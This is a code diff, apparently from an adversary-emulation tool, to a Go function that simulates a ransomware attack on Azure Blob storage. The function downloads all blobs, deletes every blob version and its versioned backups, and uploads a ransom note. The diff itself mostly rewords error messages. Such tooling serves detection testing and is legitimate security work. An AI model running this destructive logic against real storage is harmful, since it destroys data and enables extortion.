@@ -94,27 +94,27 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	log.Println("Downloading Blobs...")
 	err = downloadAllBlobs(client)
 	if err != nil {
-		return fmt.Errorf("Unable to download blobs: %w", err)
+		return fmt.Errorf("unable to download blobs: %w", err)
 	}
 
 	log.Println("Deleting Blobs...")
 	err = deleteAllBlobVersions(client)
 	if err != nil {
-		return fmt.Errorf("Unable to delete blobs: %w", err)
+		return fmt.Errorf("unable to delete blobs: %w", err)
 	}
 
 	//Delete again to delete the versioned backups
 	log.Println("Deleting versioned Blob backups...")
 	err = deleteAllBlobVersions(client)
 	if err != nil {
-		return fmt.Errorf("Unable to delete blobs: %w", err)
+		return fmt.Errorf("unable to delete blobs: %w", err)
 	}
 
 	log.Println("Uploading ransom note...")
 
 	err = utils.UploadBlob(client, RansomContainerName, RansomNoteFilename, strings.NewReader(RansomNoteContents))
 	if err != nil {
-		return fmt.Errorf("Unable to create ransom note: %w", err)
+		return fmt.Errorf("unable to create ransom note: %w", err)
 	}
 	log.Println("Technique execution completed")
 	return nil
@@ -132,10 +132,10 @@ func downloadAllBlobs(client *azblob.Client) error {
 		return err
 	}
 	for containerName, versionMap := range blobMap {
-		for blobName, _ := range versionMap {
+		for blobName := range versionMap {
 			_, err := client.DownloadFile(context.Background(), containerName, blobName, f, nil)
 			if err != nil {
-				return fmt.Errorf("Error when downloading blob %s in container %s: %w", blobName, containerName, err)
+				return fmt.Errorf("error when downloading blob %s in container %s: %w", blobName, containerName, err)
 			}
 		}
 	}
@@ -159,7 +159,7 @@ func deleteAllBlobVersions(client *azblob.Client) error {
 					blobClient, err = blobClient.WithVersionID(*versionID)
 					log.Println("Deleting Blob", blobName, "with version", *versionID)
 					if err != nil {
-						return fmt.Errorf("Can't instantiate versioned client %s: %w", blobName, containerName, err)
+						return fmt.Errorf("can't instantiate versioned client for blob %s in container %s: %w", blobName, containerName, err)
 					}
 
 				}
@@ -171,7 +171,7 @@ func deleteAllBlobVersions(client *azblob.Client) error {
 					})
 
 				if err != nil {
-					return fmt.Errorf("Error when deleting blob %s in container %s: %w", blobName, containerName, err)
+					return fmt.Errorf("error when deleting blob %s in container %s: %w", blobName, containerName, err)
 				}
 			}
 		}
